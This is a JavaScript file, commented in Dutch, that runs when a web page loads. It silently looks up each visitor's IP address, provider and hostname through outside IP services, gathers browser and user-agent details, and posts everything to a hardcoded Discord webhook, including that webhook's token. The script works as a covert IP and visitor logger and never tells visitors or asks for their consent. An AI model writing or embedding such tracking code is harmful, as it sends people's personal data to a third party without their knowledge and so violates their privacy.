// Discord webhook URL
const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1348762922960027730/KiCxIrTuv5bihTxm6-1PmuWmWdpTZWG5r2Q2IKvYkIG9f-DWv_Uq8pNhcBOYPkjnscVt';

// Functie om IP informatie op te halen
async function getIPInfo() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const ipData = await response.json();
        
        // Haal extra IP informatie op
        const detailResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
        const details = await detailResponse.json();
        
        return {
            ip: ipData.ip,
            provider: details.org,
            hostname: details.hostname || 'Niet beschikbaar',
            socket: `${details.ip}:${location.port || '80'}`
        };
    } catch (error) {
        console.error('Fout bij ophalen IP informatie:', error);
        return {
            ip: 'Niet beschikbaar',
            provider: 'Niet beschikbaar',
            hostname: 'Niet beschikbaar',
            socket: 'Niet beschikbaar'
        };
    }
}

// Functie om browser informatie te verzamelen
function getBrowserInfo() {
    const ua = navigator.userAgent;
    let browserName = 'Onbekend';
    let browserCodeName = navigator.appCodeName;
    let browserVersion = 'Onbekend';
    
    // Detecteer browser naam en versie
    if (ua.includes('Firefox/')) {
        browserName = 'Firefox';
        browserVersion = ua.split('Firefox/')[1];
    } else if (ua.includes('Chrome/')) {
        browserName = 'Chrome';
        browserVersion = ua.split('Chrome/')[1].split(' ')[0];
    } else if (ua.includes('Safari/') && !ua.includes('Chrome')) {
        browserName = 'Safari';
        browserVersion = ua.split('Version/')[1].split(' ')[0];
    } else if (ua.includes('Edge/')) {
        browserName = 'Edge';
        browserVersion = ua.split('Edge/')[1];
    }

    return {
        name: browserName,
        codeName: browserCodeName,
        version: browserVersion,
        userAgent: ua
    };
}

// Functie om gegevens naar Discord te sturen
async function sendToDiscord(ipInfo, browserInfo) {
    const embed = {
        title: '🔍 Nieuwe Bezoeker Gedetecteerd',
        color: 3447003,
        fields: [
            {
                name: '🌐 Internet & IP Informatie',
                value: `**IP Adres:** ${ipInfo.ip}\n**Provider:** ${ipInfo.provider}\n**Hostname:** ${ipInfo.hostname}\n**Socket:** ${ipInfo.socket}`,
                inline: false
            },
            {
                name: '🖥️ Browser Informatie',
                value: `**Browser:** ${browserInfo.name}\n**Code Naam:** ${browserInfo.codeName}\n**Versie:** ${browserInfo.version}\n**User Agent:** ${browserInfo.userAgent}`,
                inline: false
            }
        ],
        timestamp: new Date().toISOString()
    };

    try {
        await fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ embeds: [embed] })
        });
    } catch (error) {
        console.error('Fout bij verzenden naar Discord:', error);
    }
}

// Start tracking wanneer de pagina geladen is
document.addEventListener('DOMContentLoaded', async () => {
    const ipInfo = await getIPInfo();
    const browserInfo = getBrowserInfo();
    await sendToDiscord(ipInfo, browserInfo);
}); 